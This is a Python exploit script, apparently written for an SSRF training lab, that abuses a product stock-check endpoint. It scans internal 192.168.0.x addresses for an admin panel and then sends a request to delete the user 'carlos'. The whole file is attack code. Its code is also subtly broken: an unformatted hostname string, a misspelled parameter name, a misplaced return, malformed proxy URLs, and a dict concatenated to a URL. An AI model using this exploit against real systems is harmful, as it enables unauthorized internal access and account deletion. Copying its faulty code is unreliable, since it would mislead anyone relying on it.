import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def check_admin_hostname(url):
    check_stock_path_url = '/product/stock'
    admin_ip_address =  ''
    for i in range(1,225):
        hostname ='http://192.168.0.%s:8080/admin%i'
        parameters = {'stocApi':hostname}
        r = requests.post(url + check_stock_path_url, data=parameters, verify=False, proxies=proxies)
        if r.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i
            break
    if admin_ip_address =='':
        print("(-) Could not find admin hostname")
        return admin_ip_address

def delete_user(url, admin_ip_address):
    delete_user_url_ssrf_payload ='https://%s:8080/admin/delete?username=carlos' %admin_ip_address
    check_stock_path_url = '/product/stock'
    parameters = {'stockApi':delete_user_url_ssrf_payload}
    r = requests.get(url + check_stock_path_url, data=parameters, verify=False, proxies=proxies)
    #check if user has been deleted or not 
    admin_csrf_payload = 'https://%s:8080/admin/'
    admin_parameters = {'stockApi':admin_csrf_payload}
    r = requests.post(url + admin_parameters, data=admin_parameters, verify=False, proxies=proxies)
    if 'User deleted successfully' in r:
        print("(+) User Carlos is deleted successfully")
    else:
        print("(+) Could not delete user successfully")
        
def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    url = sys.argv[1]
    print("(+) Exploiting the SSRF vulnerability... ")
    print("(+) Finding the admin hostname...")
    admin_ip_address = check_admin_hostname(url) 
    print("(+) Found the admin IP address: %s" % admin_ip_address)
    print("(+) Deleting the carlos user...")
    delete_user(url, admin_ip_address)

if __name__ == '__main__':
    main()